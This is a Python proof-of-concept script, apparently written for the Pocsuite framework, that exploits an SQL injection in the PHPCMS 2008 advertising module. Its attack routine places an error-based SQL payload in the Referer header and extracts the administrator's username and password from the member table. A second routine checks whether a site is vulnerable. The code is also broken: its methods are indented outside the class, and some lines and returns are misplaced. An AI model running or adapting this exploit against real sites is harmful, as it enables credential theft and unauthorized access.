#!/usr/bin/env python
# coding: utf-8
import re
import urlparse
from t import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

class TestPOC(POCBase):
    vulID = '62274' # ssvid
    version = '1'
    author = ['Medici.Yan']
    vulDate = '2011-11-21'
    createDate = '2015-09-23'
    updateDate = '2015-09-23'
    references = ['']
    name = '_62274_phpcms_2008_place_sql_inj_PoC'
    appPowerLink = ''
    appName = 'PHPCMS'
    appVersion = '2008'
    vulType = 'SQL Injection'
    desc = '''
    phpcms 2008 中广告模块，存在参数过滤不严，
    导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，
    如果关闭了错误显示，可以采用基于时间和错误的盲注
    '''
    samples = ['']

def _attack(self):
    result = {}
    vulurl = urlparse.urljoin(self.url, '/data/js.php?id=1')
    payload = "1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT concat(char(45,45),username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1))a from information_schema.tables group by a)b), '0')#"
    head = {
        'Referer': payload
    }
    resp = req.get(vulurl, headers=head)
    if resp.status_code == 200:
        match_result = re.search(r'Duplicate entry \'1--(.+)---(.+)--\' for key', resp.content, re.I | re.M)
    if match_result:
        result['AdminInfo'] = {}
        result['AdminInfo']['Username'] = match_result.group(1)
        result['AdminInfo']['Password'] = match_result.group(2)
    return self.parse_attack(result)

def _verify(self):
    result = {}
    vulurl = urlparse.urljoin(self.url, '/data/js.php?id=1')
    payload = "1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2), md5(1))a from information_schema.tables group by a)b), '0')#"
    head = {
        'Referer': payload
    }
resp = req.get(vulurl, headers=head)
    if resp.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = vulurl
        result['VerifyInfo']['Payload'] = payload

    return self.parse_attack(result)

def parse_attack(self, result):
    output = Output(self)
    if result:
        output.success(result)
    else:
        output.fail('Internet nothing returned')
        return output

register(TestPOC)
